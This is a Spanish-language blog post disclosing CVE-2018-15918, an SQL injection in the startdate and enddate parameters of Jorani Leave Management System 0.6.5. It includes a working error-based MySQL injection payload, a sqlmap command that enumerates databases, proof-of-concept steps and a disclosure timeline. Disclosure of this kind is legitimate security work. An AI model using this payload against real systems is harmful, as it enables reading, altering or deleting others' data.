+++
date = "2018-09-03"
title = "CVE-2018-15918 Jorani Leave Management System 0.6.5 - SQL Injection"
author = "Javier Olmedo"
toc = false
+++

Esta entrada tiene como finalidad hacer pÃºblica la vulnerabilidadÂ [SQL Injection](https://www.owasp.org/index.php/SQL_Injection)Â descubierta en el softwareÂ [Jorani Leave Management System 0.6.5](https://jorani.org/download.html), la vulnerabilidad ha sido asociada alÂ [CVE-2018-159178](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2018-15918).

## JoraniÂ CVE-2018-15918

### Jorani Leave Management System 0.6.5 â€“ SQL Injection

[![/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_001.jpg](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_001.jpg)](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_001.jpg)

Jorani es un sistema de administraciÃ³n de licencias desarrollado en PHP / MySQL bajo una licencia AGPL v3, estÃ¡ diseÃ±ado para proporcionar solicitud de flujos de trabajo simples y tiempo extra para organizaciones pequeÃ±as.

- ğŸ“…Â Vulnerabilidad descubierta porÂ [Javier Olmedo](https://twitter.com/JJavierOlmedo)Â elÂ **02/08/2018**
- ğŸ’£ Publicada elÂ **03/09/2018**
- ğŸ›Â [CVE-2018-15918](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15918)
- ğŸ”—Â Link del softwareÂ [Jorani Leave Management System](https://jorani.org/download.html)
- ğŸÂ VersiÃ³n vulnerable =Â **0.6.5 y posiblemente anteriores**

## Vector de ataque / Criticidad de la explotaciÃ³n

### CRITICIDAD -Â ğŸŸ£ CRÃTICA ğŸŸ£

A travÃ©s de las vulnerabilidadesÂ [SQL Injection](https://www.owasp.org/index.php/SQL_Injection), un usuario malintencionadoÂ podrÃ­aÂ **leer, modificar o borrar**Â informaciÃ³n de la base de datos que utiliza la aplicaciÃ³n, lanzar comandos al sistema operativo oÂ causar unaÂ [denegaciÃ³n de servicio](https://es.wikipedia.org/wiki/Ataque_de_denegaci%C3%B3n_de_servicio)Â con el objetivo deÂ **obtener informaciÃ³n confidencial, escalar privilegios o dejar inoperativa la aplicaciÃ³n.**

## ParÃ¡metros vulnerables

Los parÃ¡metrosÂ `startdate` y `enddate`Â son vulnerable a ataquesÂ **SQL Injection**Â a travÃ©s de peticionesÂ **POST**Â en el recursoÂ `/leaves/validate`,Â estas peticiones permiten las condicionesÂ `WHERE`, `HAVING`, `ORDER BY`Â yÂ `GROUP BY`, lo que permite que seanÂ **fÃ¡cilmente explotables**Â yÂ **recuperar grandes cantidades de informaciÃ³n**Â de la base de datos con una sola consulta.

**ğŸ’‰ Payload**

```txt
id=1&type=compensate&startdate=2018-08-02&enddate=2018-08-03â€²) AND (SELECT 2138 FROM(SELECT COUNT(*),CONCAT(0x7178787071,(SELECT (ELT(2138=2138,1))),0x716b716271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (â€˜WfLIâ€™=â€™WfLI&startdatetype=Morning&enddatetype=Afternoon&leave_id=
```

ğŸ“·Â **Captura de pantalla de SQLmap lanzando el comando**

```txt
sqlmap -r jorani-poc.req -p enddate --dbms=MySQL --dbs
```

[![/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_002.png](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_002.png)](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_002.png)

## Prueba de concepto (PoC)

**1.**Â Â Si aÃ±adimos el caracterÂ `'`Â en el parÃ¡metroÂ `startdate`Â obtenemos unÂ **error en la aplicaciÃ³n**

**1.1 PeticiÃ³n**

[![/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_003.png](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_003.png)](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_003.png)

**1.2 Respuesta**

[![/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_004.png](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_004.png)](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_004.png)

**2.**Â En cambio, al aÃ±adir dosÂ `'`, obtenemos unÂ **cÃ³digo 200 OK**

**2.1 PeticiÃ³n**

[![/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_005.png](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_005.png)](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_005.png)

**2.2 Respuesta**

[![/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_006.png](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_006.png)](/images/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection/cve-2018-15918-jorani-leave-management-system-0-6-5-sql-injection_006.png)

## Timeline

- **02/08/2018**Â Descubrimiento de la vulnerabilidad
- **02/08/2018**Â Creo issue en GitHub del proyecto
- **03/08/2018**Â El desarrollador invalida y cierra el issue ğŸ˜¥
- **27/08/2018**Â Solicito CVE
- **28/08/2018**Â AsignaciÃ³n de CVE-2018-15918 por MITRE
- **03/09/2018**Â Hago pÃºblica la vulnerabilidad

## Referencias

CVE-MITRE -Â [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15918](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15918)

Un saludo a todos!!Â ğŸ‘‹